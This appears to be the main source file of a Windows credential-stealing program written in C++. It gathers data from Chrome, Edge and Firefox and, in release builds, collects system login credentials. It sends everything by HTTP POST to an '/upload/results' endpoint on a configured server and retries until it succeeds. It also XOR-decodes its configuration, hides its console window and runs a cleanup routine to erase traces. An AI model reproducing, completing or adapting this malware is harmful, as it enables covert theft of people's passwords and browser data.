#include "Configuration.h"
#include "Chrome.h"
#include "Firefox.h"
#include "Credentials.h"
#include "Connection.h"
#include "Cleanup.h"
#include "Edge.h"


static void SendAllProducts(awesomejson::json& jProductResults, std::string& sSessionId, HINTERNET& hUserSession)
{
	bool status = Tool::HttpCommunication::HttpRequests::SendPostRequest(jProductResults, STR("/upload/results"), sSessionId, hUserSession);
	while (!status) {
		status = Tool::HttpCommunication::HttpRequests::SendPostRequest(jProductResults, STR("/upload/results"), sSessionId, hUserSession);
	}
}


int main() {
	// Main configuration that will be overiden from patcher
	static const unsigned char CONFIG_BUFFER[1000] = "{\"Domain\":\"\",\"Port\":\"\",\"ProductsPath\":\"\"}";

#ifndef NDEBUG
	// Load the config from plaint text
	auto MainContext = Tool::Configuration::Configuration((char*)CONFIG_BUFFER);
	Tool::Utils::print(std::format(STR("Loaded config: \n{}\n{}"), MainContext.MainContext_t.sDomain, MainContext.MainContext_t.sMainDirectory));
#else
	//Loading encoded configuration from binary
	auto MainConfigObject = Tool::Utils::XOR((char*)CONFIG_BUFFER);
	std::replace(MainConfigObject.begin(), MainConfigObject.end(), '*', '{');
	auto MainContext = Tool::Configuration::Configuration(MainConfigObject);
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA(STR("ConsoleWindowClass"), NULL);
	ShowWindow(stealth, 0);
#endif

	std::string sSessionIdObject = STR("{\"Session-ID\": \"") + MainContext.MainContext_t.sSessionId + "\"}";
	awesomejson::json jProductResults(awesomejson::json::parse(sSessionIdObject));

	// Chrome
	auto chromeObject = Tool::Browsers::Chrome(MainContext.MainContext_t);
	Tool::Browsers::Browser::Execute(chromeObject, MainContext.MainContext_t, jProductResults);

	// Edge
	auto edgeObject = Tool::Browsers::Edge(MainContext.MainContext_t);
	Tool::Browsers::Browser::Execute(edgeObject, MainContext.MainContext_t, jProductResults);
	
	// Firefox
	auto firefoxObject = Tool::Browsers::Firefox(MainContext.MainContext_t);
	Tool::Browsers::Browser::Execute(firefoxObject, MainContext.MainContext_t, jProductResults);
	Tool::Utils::print(jProductResults);

	// Credentials
#ifndef NDEBUG
#else
	awesomejson::json jLoginCredentials = awesomejson::json({});
	auto credentialsObject = Tool::Credentials();
	credentialsObject.GatherLoginCredentials(jLoginCredentials);
	jProductResults.merge_patch(jLoginCredentials);
#endif
	
	SendAllProducts(jProductResults, MainContext.MainContext_t.sSessionId, MainContext.MainContext_t.hUserSession);

#ifndef NDEBUG
#else
	//Cleanup
	Tool::Cleanup::CleanAll(MainContext.MainContext_t.sMainDirectory);
#endif
};